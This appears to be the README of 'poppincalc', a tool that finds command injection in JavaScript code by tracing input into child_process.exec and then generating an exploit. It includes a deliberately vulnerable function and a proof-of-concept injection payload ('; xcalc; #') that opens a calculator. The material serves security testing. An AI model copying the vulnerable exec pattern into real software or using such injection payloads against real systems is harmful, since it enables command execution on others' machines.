# How Does `poppincalc` Work?

`poppincalc` takes one argument `target`. This `target` can either be a path to a codebase or a URL to a git repository.

### Example:

    $ poppincalc /path/to/random_project
  
    $ poppincalc https://github.com/zealabs/poppincalc.git
  
# The Algorithm

`poppincalc` recursively performs a file search where it lists all the files in the codebase directory. Like this:

```
├── LICENSE
├── main.go
├── README.md
├── src
│   └── modules
│       ├── javascript.go
│       └── read_source.go
└── templates
    ├── go.yaml
    ├── javascript.yaml
    ├── python.yaml
    └── ruby.yaml
```

Almost every project has a configuration file. For example in a `NodeJS` project, there is a file named `package.json`. In this `package.json` file there will be a JSON key called `main`:

```json
"main": "app.js"
```

This will be the first script to the fuzzing queue. To identify a **Command Injection** vulnerability, one of the example is `child_process`.

### Here is an example:

```js
const example = require('child_process');

module.exports = function Testing(input) {
  example.exec("git clone "+input);
} 
```

### `poppincalc`'s Approach To Identify The Vulnerability

`poppincalc` searches for the keyword:

```js
require('child_process')
```

And gets the full line which contains this keyword.

So that is:

```js
const example = require('child_process');
```

So here `example` is the function to call the methods from `child_process`. So we have to carve out just that.

### How Do We Do That?

We have reserved keywords in every languages, all we need a list/dict of that.

Some example reserved keywords in JavaScript are:

```
let
var
const
function
return
for
if
else
...
...
```

If we remove these keywords and strip out whitespaces, we will end up with:

```
example
```

This is the function we use to call the methods of `child_process`.

### Identifying Where `child_process` Is Used?

```js
const example = require('child_process');

module.exports = function Testing(input) {
  example.exec("git clone "+input);
} 
```

Here in this example vulnerable script, the `public` exported function `Testing()` is what calling the `exec()` method from `child_process`. We can do the same with carving out reserved keywords and identifying the function name that calls this vulnerable `exec()` function.

### Exploit Generation

Now `poppincalc` knows the function `example` is `child_process` and `example.exec()` method call belongs to the function `Testing` which takes in an argument variable `input`.

`input` is not a reserved keyword so we also have that in out hand, so `poppincalc` checks for sinks of every string retrieved in the script. Only `input` sinks into the `example.exec()` which means the payload is to be given to function `Testing()`.

### Payload Generation Steps

1. Import the vulnerable script (let's say `vulnerable.js`)
2. Call the vulnerable function with the payload as argument.

**Step 1:**

```js
const vulnerable = require('./vulnerable.js');
```

**Step 2:**

```js
vulnerable.Testing("; xcalc; #");
```

**Combining The Exploit:**

```js
const vulnerable = require('./vulnerable.js');

vulnerable.Testing("; xcalc; #");
```

Now `poppincalc` will generate multiple payloads to test what works because some of them can lead to false-positives since how the command crafted can be different in different use cases.

For testing, the payload would be to print out something and read the `stdout` to ensure the successfull exploitation. This payload pattern is then used to _**pop open a calculator**_.

**Finally the exploit is executed:**

    $ node exploit.js
  
### POPPED A CALC!

![calc](https://i.imgur.com/GNlTkeT.png)

Just like this popular languages' parsers will be written to strip out reserved keywords and identify what the vulnerable function belongs to and where it's called!

<hr>
